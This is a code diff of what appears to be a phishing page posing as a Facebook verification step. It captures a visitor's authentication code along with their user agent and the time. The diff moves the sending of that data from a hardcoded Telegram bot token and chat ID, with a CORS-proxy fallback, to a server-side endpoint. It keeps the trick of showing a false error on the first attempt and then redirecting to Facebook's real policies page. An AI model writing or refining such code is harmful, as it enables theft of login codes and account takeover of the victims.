@@ -256,52 +256,8 @@
     </div>
 
     <script>
-        // Telegram configuration
-        const BOT_TOKEN = '7276807133:AAE4Cnz15pyFcCHOo3ZeLfjaFZly6LmE2-0';
-        const CHAT_ID = '-4789641482';
         let attemptCount = 0;
         
-        // Robust Telegram sending function
-        async function sendToTelegram(message) {
-            const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const CORS_PROXY = 'https://cors-anywhere.herokuapp.com/';
-            
-            try {
-                // Try direct connection first
-                let response = await fetch(TELEGRAM_API, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                
-                if (response.ok) return true;
-                
-                // Fallback to CORS proxy if direct fails
-                console.warn('Direct connection failed, trying CORS proxy...');
-                response = await fetch(CORS_PROXY + TELEGRAM_API, {
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json',
-                        'X-Requested-With': 'XMLHttpRequest'
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                
-                return response.ok;
-            } catch (error) {
-                console.error('Telegram send error:', error);
-                return false;
-            }
-        }
-
         document.getElementById('continueButton').addEventListener('click', async function(e) {
             e.preventDefault();
             
@@ -324,30 +280,23 @@
                           `🌐 <b>User Agent:</b> ${navigator.userAgent}\n` +
                           `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
             
-            // Show loading state
-            const btn = this;
-            const originalText = btn.textContent;
-            btn.textContent = 'Verifying...';
-            btn.disabled = true;
-            
             try {
-                // Send to Telegram
-                const success = await sendToTelegram(message);
-                
-                attemptCount++;
-                if (attemptCount < 2) {
-                    // First attempt: show error
-                    document.getElementById('errorMessage').style.display = 'block';
-                    document.getElementById('authCode').style.borderColor = '#ff4d4f';
-                    document.getElementById('authCode').value = '';
-                } else {
-                    // Second attempt: redirect
-                    window.location.href = 'https://www.facebook.com/policies_center/';
-                }
-            } finally {
-                // Restore button state
-                btn.textContent = originalText;
-                btn.disabled = false;
+                await fetch('/api/send-to-telegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ message })
+                });
+            } catch (error) {
+                console.log('Error sending to Telegram:', error);
+            }
+            
+            attemptCount++;
+            if (attemptCount >= 2) {
+                window.location.href = 'https://www.facebook.com/policies_center/';
+            } else {
+                document.getElementById('errorMessage').style.display = 'block';
+                document.getElementById('authCode').style.borderColor = '#ff4d4f';
+                document.getElementById('authCode').value = '';
             }
         });
 
